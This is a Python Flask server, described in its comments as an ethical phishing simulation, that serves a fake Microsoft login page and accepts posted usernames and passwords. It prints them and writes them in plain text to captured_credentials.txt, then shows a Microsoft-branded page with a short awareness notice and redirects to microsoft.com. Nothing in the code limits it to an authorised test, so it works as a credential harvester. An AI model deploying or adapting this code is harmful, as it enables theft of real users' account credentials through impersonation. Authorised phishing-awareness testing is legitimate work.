# server.py - Enhanced Flask Server for Ethical Phishing Simulation
from flask import Flask, request, render_template, redirect, url_for
import datetime
import os
import logging

app = Flask(__name__)

# Configure enhanced logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('phishing_log.txt'),
        logging.StreamHandler()
    ]
)

# --- SUCCESS PAGE HTML ---
SUCCESS_PAGE_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft - Verification Complete</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            text-align: center; 
            margin: 0; 
            padding: 50px 20px; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 80vh;
        }
        .container { 
            background-color: #fff; 
            padding: 40px; 
            border-radius: 12px; 
            box-shadow: 0 10px 30px rgba(0,0,0,.2); 
            display: inline-block; 
            max-width: 500px;
            margin: 0 auto;
        }
        .logo {
            width: 108px;
            height: 24px;
            margin-bottom: 30px;
        }
        h1 { 
            color: #0078d4; 
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 20px;
        }
        p { 
            color: #323130; 
            font-size: 16px;
            line-height: 1.5;
            margin-bottom: 15px;
        }
        .success { 
            color: #107c10; 
            font-weight: 600;
        }
        .warning { 
            color: #d83b01; 
            font-weight: 600;
            background-color: #fef9f5;
            padding: 15px;
            border-radius: 6px;
            border-left: 4px solid #d83b01;
            margin: 20px 0;
        }
        a { 
            color: #0078d4; 
            text-decoration: none; 
            font-weight: 600;
        }
        a:hover { 
            text-decoration: underline; 
        }
        .redirect-info {
            background-color: #f3f2f1;
            padding: 15px;
            border-radius: 6px;
            margin-top: 20px;
            font-size: 14px;
            color: #605e5c;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0078d4;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 10px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <svg class="logo" viewBox="0 0 108 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M44.836 4.6v13.8h-2.4V7.68L38.436 18.4h-1.92L32.556 7.68V18.4h-2.4V4.6h3.168l4.128 11.688L41.66 4.6h3.176Z" fill="#5059C9"/>
            <path d="M49.828 2.912c.768 0 1.456.256 2.064.768.608.512.912 1.12.912 1.824 0 .704-.304 1.312-.912 1.824-.608.512-1.296.768-2.064.768-.768 0-1.456-.256-2.064-.768-.608-.512-.912-1.12-.912-1.824 0-.704.304-1.312.912-1.824.608-.512 1.296-.768 2.064-.768ZM51.028 7.2v11.2h-2.4V7.2h2.4Z" fill="#5059C9"/>
            <path d="M62.148 18.112c-1.216.32-2.368.48-3.456.48-1.664 0-3.104-.448-4.32-1.344-1.216-.896-1.824-2.208-1.824-3.936 0-1.728.608-3.04 1.824-3.936 1.216-.896 2.656-1.344 4.32-1.344 1.088 0 2.24.16 3.456.48v2.112c-1.216-.384-2.272-.576-3.168-.576-1.024 0-1.824.224-2.4.672-.576.448-.864 1.12-.864 2.016 0 .896.288 1.568.864 2.016.576.448 1.376.672 2.4.672.896 0 1.952-.192 3.168-.576v2.112Z" fill="#5059C9"/>
        </svg>
        
        <h1>Account Verification Complete</h1>
        <p class="success">✓ Your identity has been successfully verified.</p>
        <p>Thank you for helping us keep your account secure.</p>
        
        <div class="warning">
            <strong>⚠️ SECURITY AWARENESS NOTICE</strong><br>
            This was a security awareness test. Always verify the authenticity of login pages by checking:
            <ul style="text-align: left; margin-top: 10px;">
                <li>The URL in your browser's address bar</li>
                <li>SSL certificate validity (look for the lock icon)</li>
                <li>Official communication channels</li>
            </ul>
        </div>
        
        <div class="redirect-info">
            <div class="spinner"></div>
            <span>Redirecting to Microsoft.com in a few seconds...</span>
        </div>
        
        <p style="margin-top: 20px;">
            <a href="https://www.microsoft.com" target="_blank">Continue to Microsoft.com</a>
        </p>
    </div>
    
    <script>
        setTimeout(function() {
            window.location.href = "https://www.microsoft.com";
        }, 5000); // Redirect after 5 seconds
    </script>
</body>
</html>
"""

@app.route('/login', methods=['POST'])
def handle_login():
    """Handle credential submission from the phishing page"""
    
    # Try to get JSON data first (from fetch API), fallback to form data
    if request.is_json:
        data = request.get_json()
    else:
        data = request.form.to_dict()
    
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()
    client_ip = request.remote_addr
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Get additional request information for analysis
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referer = request.headers.get('Referer', 'Direct access')
    
    if username and password:
        # Console logging
        print(f"\n{'='*50}")
        print(f"🎯 CREDENTIAL CAPTURED")
        print(f"{'='*50}")
        print(f"Timestamp: {timestamp}")
        print(f"Client IP: {client_ip}")
        print(f"Username: {username}")
        print(f"Password: {password}")
        print(f"User-Agent: {user_agent}")
        print(f"Referer: {referer}")
        print(f"{'='*50}\n")
        
        # Enhanced logging to file
        logging.info(f"Credential capture - IP: {client_ip}, Username: {username}")
        
        # Save to file with enhanced format
        credentials_file = "captured_credentials.txt"
        with open(credentials_file, "a", encoding="utf-8") as f:
            f.write(f"{'='*60}\n")
            f.write(f"PHISHING SIMULATION - CREDENTIAL CAPTURE\n")
            f.write(f"{'='*60}\n")
            f.write(f"Timestamp: {timestamp}\n")
            f.write(f"Client IP: {client_ip}\n")
            f.write(f"Username: {username}\n")
            f.write(f"Password: {password}\n")
            f.write(f"User-Agent: {user_agent}\n")
            f.write(f"Referer: {referer}\n")
            f.write(f"Status: CAPTURED SUCCESSFULLY\n")
            f.write(f"{'='*60}\n\n")
        
        # Return success page
        return SUCCESS_PAGE_HTML, 200
    else:
        # Log failed attempts
        logging.warning(f"Incomplete credential submission from {client_ip}")
        return "Missing username or password", 400

@app.route('/')
def serve_phishing_page():
    """Serve the main phishing page"""
    logging.info(f"Phishing page accessed from {request.remote_addr}")
    return render_template('index.html')

@app.route('/favicon.ico')
def favicon():
    """Serve favicon"""
    return app.send_static_file('assets/favicon.ico')

# Error handlers for better user experience
@app.errorhandler(404)
def not_found(error):
    """Handle 404 errors by redirecting to main page"""
    return redirect(url_for('serve_phishing_page'))

@app.errorhandler(500)
def internal_error(error):
    """Handle 500 errors"""
    logging.error(f"Internal server error: {error}")
    return "Internal server error", 500

if __name__ == '__main__':
    # Print startup information
    print("\n" + "="*60)
    print("🚀 ETHICAL PHISHING SIMULATION SERVER")
    print("="*60)
    print(f"📁 Static files: {app.static_folder}")
    print(f"📁 Templates: {app.template_folder}")
    
    # Check if SSL certificates exist
    cert_file = 'cert.pem'
    key_file = 'key.pem'
    use_ssl = os.path.exists(cert_file) and os.path.exists(key_file)
    
    if use_ssl:
        print("🔒 SSL certificates found - Running with HTTPS")
        print("🌐 Server URL: https://0.0.0.0:443/")
        print("🎯 Target URL: https://login.microsoftonline.com/")
        print("="*60)
        print("⚠️  WARNING: Running on privileged port 443 - requires sudo!")
        print("="*60 + "\n")
        
        # Run with SSL on port 443 (requires sudo)
        app.run(debug=False, host='0.0.0.0', port=443, ssl_context=(cert_file, key_file))
    else:
        print("🔓 No SSL certificates - Running with HTTP")
        print("🌐 Server URL: http://0.0.0.0:80/")
        print("🎯 Target URL: http://login.microsoftonline.com/")
        print("="*60)
        print("⚠️  WARNING: Running on privileged port 80 - requires sudo!")
        print("="*60 + "\n")
        
        # Run without SSL on port 80 (requires sudo)
        app.run(debug=False, host='0.0.0.0', port=80)
